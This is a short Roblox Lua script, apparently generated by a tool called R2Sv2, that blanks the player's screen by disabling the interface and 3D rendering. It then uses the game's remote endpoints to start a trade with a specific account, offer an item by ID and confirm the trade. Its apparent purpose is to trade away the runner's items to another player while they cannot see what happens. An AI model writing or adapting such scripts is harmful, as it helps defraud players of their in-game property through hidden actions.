game:GetService('StarterGui'):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
for i,v in ipairs(game:GetDescendants())do
    if v:IsA('ScreenGui')then
         v.Enabled = false
end end
game:GetService("RunService"):Set3dRenderingEnabled(false)
game:GetService("ReplicatedStorage").endpoints["client_to_server"]["start_trade_request"]:InvokeServer(game:GetService("Players").mTmLGyxQd)
wait(10)
-- Script generated by R2Sv2
-- R2Sv2 developed by Luckyxero
 


game:GetService("ReplicatedStorage").endpoints["client_to_server"]["save_notifications_state"]:InvokeServer(Inventory, 0)
-- Script generated by R2Sv2
-- R2Sv2 developed by Luckyxero
 

game:GetService("ReplicatedStorage").endpoints["client_to_server"]["offer_unit"]:InvokeServer("{7a4c3644-4f75-4c0c-a6a6-0e3281407ad9}")
-- Script generated by R2Sv2
-- R2Sv2 developed by Luckyxero
 

game:GetService("ReplicatedStorage").endpoints["client_to_server"]["ready_trade"]:InvokeServer()
